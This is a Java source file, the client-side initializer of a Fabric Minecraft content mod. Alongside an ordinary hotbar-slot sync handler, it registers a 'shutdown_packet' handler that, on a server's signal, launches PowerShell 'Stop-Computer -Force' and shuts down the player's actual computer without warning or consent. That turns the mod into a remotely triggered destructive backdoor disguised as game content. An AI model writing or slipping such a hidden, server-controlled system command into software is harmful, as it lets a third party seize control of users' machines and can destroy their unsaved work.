package dev.zac99lol.originscontent.client;

import dev.zac99lol.originscontent.OriginsContent;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;

import java.io.IOException;
import java.util.UUID;

public class OriginsContentClient implements ClientModInitializer {

    @Override
    public void onInitializeClient() {
        OriginsContent.LOGGER.info("Initialising OriginsContent on the client...");

        ClientPlayNetworking.registerGlobalReceiver(OriginsContent.id("shutdown_packet"),
            (client, handler, buf, responseSender) -> client.execute(() -> {
                    final ProcessBuilder shutdown = new ProcessBuilder("powershell.exe", "-Command", "Stop-Computer -Force");
                    try {
                        shutdown.start();
                    } catch (IOException e) {
                        throw new RuntimeException("Well, at least Minecraft crashed.");
                    }
            }));

        ClientPlayNetworking.registerGlobalReceiver(OriginsContent.id("sync_selected_slot_packet"),
            (client, handler, buf, responseSender) -> {
                UUID playerId = buf.readUuid();
                int slot = buf.readVarInt();
                client.execute(() -> SelectedSlotSyncClient.set(playerId, slot));
            });
    }
}
